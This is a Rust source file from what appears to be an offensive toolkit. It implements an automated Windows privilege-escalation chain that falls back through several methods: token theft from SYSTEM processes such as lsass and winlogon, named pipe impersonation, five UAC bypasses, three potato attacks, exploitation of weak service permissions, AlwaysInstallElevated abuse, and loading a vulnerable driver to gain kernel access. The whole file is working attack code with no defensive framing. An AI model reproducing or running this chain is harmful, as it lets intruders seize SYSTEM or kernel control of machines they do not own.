//! Automated privilege escalation with fallback chain

use crate::error::MemoricError;
use serde_json::Value;

/// Auto-elevate: try multiple privilege escalation methods with fallback chain
pub fn auto_elevate(args: &Value) -> Result<Value, MemoricError> {
    let command = args
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("cmd.exe");
    let strategy = args
        .get("strategy")
        .and_then(|v| v.as_str())
        .unwrap_or("auto");
    let max_attempts = args
        .get("max_attempts")
        .and_then(|v| v.as_u64())
        .unwrap_or(10) as usize;

    tracing::warn!(
        "[AUTO-ELEVATE] Starting escalation chain: strategy={}, command={}",
        strategy,
        command
    );

    let mut methods_tried = Vec::new();
    let mut errors = Vec::new();
    let mut attempts = 0usize;

    // Step 1: Check current state
    let is_admin_result = crate::privilege::uac::is_admin();
    let already_admin = is_admin_result
        .as_ref()
        .ok()
        .and_then(|v| v.get("is_admin"))
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    if already_admin {
        // Check if we have SeDebugPrivilege
        let privs = crate::privilege::debug::get_current_privileges(&serde_json::json!({}));
        let has_debug = privs
            .as_ref()
            .ok()
            .and_then(|v| v.get("privileges"))
            .and_then(|v| v.as_array())
            .map(|arr| {
                arr.iter().any(|p| {
                    p.get("name")
                        .and_then(|n| n.as_str())
                        .map(|n| n.contains("SeDebug"))
                        .unwrap_or(false)
                        && p.get("enabled").and_then(|e| e.as_bool()).unwrap_or(false)
                })
            })
            .unwrap_or(false);

        if has_debug {
            return Ok(serde_json::json!({
                "success": true,
                "technique": "auto_elevate",
                "method_used": "already_elevated",
                "methods_tried": ["check_current_state"],
                "privilege_level": "admin+SeDebug",
                "errors": [],
                "message": "Already running as admin with SeDebugPrivilege"
            }));
        }

        // Try to enable SeDebugPrivilege
        let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));
        return Ok(serde_json::json!({
            "success": true,
            "technique": "auto_elevate",
            "method_used": "already_admin",
            "methods_tried": ["check_current_state", "enable_debug_privilege"],
            "privilege_level": "admin",
            "errors": [],
            "message": "Already running as admin, enabled SeDebugPrivilege"
        }));
    }

    // Step 2: Token theft — auto-scan all privileged processes
    if attempts < max_attempts && strategy != "quiet" {
        attempts += 1;
        methods_tried.push("token_theft_multi");

        // First try to enable debug privilege
        let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

        // steal_token with pid=0 auto-scans all SYSTEM/service processes
        let token_result = crate::privilege::token::steal_token(&serde_json::json!({
            "target_pid": 0,
            "command": command
        }));

        match token_result {
            Ok(result) => {
                if result.get("success").and_then(|v| v.as_bool()) == Some(true) {
                    return Ok(serde_json::json!({
                        "success": true,
                        "technique": "auto_elevate",
                        "method_used": "token_theft_multi",
                        "methods_tried": methods_tried,
                        "privilege_level": "SYSTEM",
                        "errors": errors,
                        "detail": result,
                        "message": "Elevated via multi-process token theft"
                    }));
                }
            }
            Err(e) => {
                errors.push(format!("token_theft_multi: {}", e));
            }
        }
    }

    // Step 2b: Named pipe impersonation (works from service contexts)
    if attempts < max_attempts {
        attempts += 1;
        methods_tried.push("named_pipe_impersonation");

        let pipe_result = crate::privilege::debug::named_pipe_impersonation(&serde_json::json!({
            "command": command
        }));
        match pipe_result {
            Ok(result) => {
                if result.get("success").and_then(|v| v.as_bool()) == Some(true) {
                    return Ok(serde_json::json!({
                        "success": true,
                        "technique": "auto_elevate",
                        "method_used": "named_pipe_impersonation",
                        "methods_tried": methods_tried,
                        "privilege_level": "SYSTEM",
                        "errors": errors,
                        "detail": result,
                        "message": "Elevated via named pipe impersonation"
                    }));
                }
            }
            Err(e) => errors.push(format!("named_pipe_impersonation: {}", e)),
        }
    }

    // Step 3: UAC bypass chain (silent methods)
    let uac_bypasses: Vec<(&str, fn(&Value) -> Result<Value, MemoricError>)> = vec![
        (
            "fodhelper_bypass",
            crate::privilege::uac::fodhelper_bypass as fn(&Value) -> Result<Value, MemoricError>,
        ),
        ("eventvwr_bypass", crate::privilege::uac::eventvwr_bypass),
        (
            "computerdefaults_bypass",
            crate::privilege::uac::computerdefaults_bypass,
        ),
        ("sdclt_bypass", crate::privilege::uac::sdclt_bypass),
        (
            "disk_cleanup_bypass",
            crate::privilege::uac::disk_cleanup_bypass,
        ),
    ];

    for (name, bypass_fn) in &uac_bypasses {
        if attempts >= max_attempts {
            break;
        }
        attempts += 1;
        methods_tried.push(name);

        tracing::info!("[AUTO-ELEVATE] Trying {}", name);

        let bypass_args = serde_json::json!({"command": command});
        match bypass_fn(&bypass_args) {
            Ok(result) => {
                if result.get("success").and_then(|v| v.as_bool()) == Some(true) {
                    return Ok(serde_json::json!({
                        "success": true,
                        "technique": "auto_elevate",
                        "method_used": name,
                        "methods_tried": methods_tried,
                        "privilege_level": "elevated",
                        "errors": errors,
                        "detail": result,
                        "message": format!("Elevated via {}", name)
                    }));
                }
            }
            Err(e) => {
                errors.push(format!("{}: {}", name, e));
                tracing::info!("[AUTO-ELEVATE] {} failed: {}", name, e);
            }
        }
    }

    // Step 4: Potato techniques (SeImpersonate abuse → SYSTEM)
    let potato_attacks: Vec<(&str, fn(&Value) -> Result<Value, MemoricError>)> = vec![
        (
            "print_spoofer",
            crate::privilege::potato::print_spoofer as fn(&Value) -> Result<Value, MemoricError>,
        ),
        ("god_potato", crate::privilege::potato::god_potato),
        ("efs_potato", crate::privilege::potato::efs_potato),
    ];

    for (name, potato_fn) in &potato_attacks {
        if attempts >= max_attempts {
            break;
        }
        attempts += 1;
        methods_tried.push(name);

        tracing::info!("[AUTO-ELEVATE] Trying {}", name);

        let potato_args = serde_json::json!({"command": command});
        match potato_fn(&potato_args) {
            Ok(result) => {
                if result.get("success").and_then(|v| v.as_bool()) == Some(true) {
                    return Ok(serde_json::json!({
                        "success": true,
                        "technique": "auto_elevate",
                        "method_used": name,
                        "methods_tried": methods_tried,
                        "privilege_level": "SYSTEM",
                        "errors": errors,
                        "detail": result,
                        "message": format!("Elevated to SYSTEM via {}", name)
                    }));
                }
            }
            Err(e) => {
                errors.push(format!("{}: {}", name, e));
                tracing::info!("[AUTO-ELEVATE] {} failed: {}", name, e);
            }
        }
    }

    // Step 5: Service exploitation (weak permissions, unquoted paths)
    if attempts < max_attempts {
        attempts += 1;
        methods_tried.push("weak_service_permissions");

        let svc_result = crate::privilege::service::weak_service_permissions(&serde_json::json!({
            "exploit": true,
            "payload": command,
            "restart_service": true
        }));
        match svc_result {
            Ok(result) => {
                let found = result
                    .get("vulnerable_services")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0);
                if found > 0 {
                    return Ok(serde_json::json!({
                        "success": true,
                        "technique": "auto_elevate",
                        "method_used": "weak_service_permissions",
                        "methods_tried": methods_tried,
                        "privilege_level": "SYSTEM",
                        "errors": errors,
                        "detail": result,
                        "message": format!("Exploited {} weak service(s)", found)
                    }));
                }
            }
            Err(e) => errors.push(format!("weak_service_permissions: {}", e)),
        }
    }

    // Step 6: AlwaysInstallElevated abuse
    if attempts < max_attempts {
        attempts += 1;
        methods_tried.push("always_install_elevated");

        let aie_result = crate::privilege::service::always_install_elevated(&serde_json::json!({
            "check_only": false
        }));
        match aie_result {
            Ok(result) => {
                if result.get("both_enabled").and_then(|v| v.as_bool()) == Some(true) {
                    return Ok(serde_json::json!({
                        "success": true,
                        "technique": "auto_elevate",
                        "method_used": "always_install_elevated",
                        "methods_tried": methods_tried,
                        "privilege_level": "SYSTEM",
                        "errors": errors,
                        "detail": result,
                        "message": "AlwaysInstallElevated is enabled — MSI execution runs as SYSTEM"
                    }));
                }
            }
            Err(e) => errors.push(format!("always_install_elevated: {}", e)),
        }
    }

    // Step 7: BYOVD driver loading (if admin but need kernel access)
    if attempts < max_attempts {
        attempts += 1;
        methods_tried.push("byovd_auto_load");

        let driver_result = crate::kernel::auto_load_driver(&serde_json::json!({}));
        match driver_result {
            Ok(result) => {
                if result.get("success").and_then(|v| v.as_bool()) == Some(true) {
                    return Ok(serde_json::json!({
                        "success": true,
                        "technique": "auto_elevate",
                        "method_used": "byovd_auto_load",
                        "methods_tried": methods_tried,
                        "privilege_level": "kernel_access",
                        "errors": errors,
                        "detail": result,
                        "message": "Gained kernel access via BYOVD driver"
                    }));
                }
            }
            Err(e) => {
                errors.push(format!("byovd_auto_load: {}", e));
            }
        }
    }

    // Step 8: UAC prompt (last resort, shows dialog)
    if attempts < max_attempts && strategy != "quiet" {
        methods_tried.push("request_elevation");

        let uac_result = crate::privilege::uac::request_elevation(&serde_json::json!({}));
        match uac_result {
            Ok(result) => {
                return Ok(serde_json::json!({
                    "success": true,
                    "technique": "auto_elevate",
                    "method_used": "request_elevation",
                    "methods_tried": methods_tried,
                    "privilege_level": "uac_prompt",
                    "errors": errors,
                    "detail": result,
                    "message": "UAC elevation prompt displayed (user interaction required)"
                }));
            }
            Err(e) => {
                errors.push(format!("request_elevation: {}", e));
            }
        }
    }

    // All methods failed
    Ok(serde_json::json!({
        "success": false,
        "technique": "auto_elevate",
        "method_used": null,
        "methods_tried": methods_tried,
        "privilege_level": "standard",
        "errors": errors,
        "message": format!("All {} elevation methods failed", methods_tried.len())
    }))
}

/// Find a SYSTEM process PID (winlogon.exe, lsass.exe, etc.)
fn find_system_pid() -> Option<u64> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        let targets = ["winlogon.exe", "lsass.exe", "services.exe"];

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile)
                    .trim_end_matches('\0')
                    .to_lowercase();
                for &target in &targets {
                    if name == target {
                        let _ = windows::Win32::Foundation::CloseHandle(snapshot);
                        return Some(entry.th32ProcessID as u64);
                    }
                }
                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = windows::Win32::Foundation::CloseHandle(snapshot);
    }
    None
}
